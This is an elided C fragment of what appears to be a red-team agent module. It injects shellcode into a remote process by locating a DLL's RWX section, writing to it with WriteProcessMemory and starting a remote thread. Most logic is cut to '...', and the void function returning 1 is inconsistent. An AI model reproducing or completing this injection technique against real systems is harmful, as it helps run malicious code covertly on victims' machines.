...
void coffee(char** argv, int argc, WCHAR** dispatch)
{
    ...
    if (hProcess == NULL)
    {
        BadgerDispatch(dispatch, "[!] Failed to Open Process. Error Code: %d\n", GetLastError());
        return 1;
    }
    ...
    {
        BadgerDispatch(dispatch, "[!] Failed to Enumerate Modules. Error Code: %d\n", GetLastError());
        return 1;
    };
    ...
    if (hDll == NULL)
    {
        BadgerDispatch(dispatch, "[!] Failed to Find Module: %d\n", GetLastError());
        return 1;
    };
    BadgerDispatch(dispatch, "[+] Remote DLL Address: %p\n", hDll);

    // calculate offset to RWX section 
    rwxSection = (PVOID)((ULONG_PTR)hDll + (ULONG_PTR)OFFSET);
    BadgerDispatch(dispatch, "[+] Remote RWX Section Address: %p\n", rwxSection);
    ...
    {
        BadgerDispatch(dispatch, "[!] WriteProcessMemory Failed: %d\n", GetLastError());
        return 1;
    };
    ...
    {
        BadgerDispatch(dispatch, "[!] Failed to Create Thread in Remote Process and Execute. Error Code: %d\n", GetLastError());
    }
    else
    {
        BadgerDispatch(dispatch, "[+] Shellcode Successfully Executed in Remote Thread\n");
    }
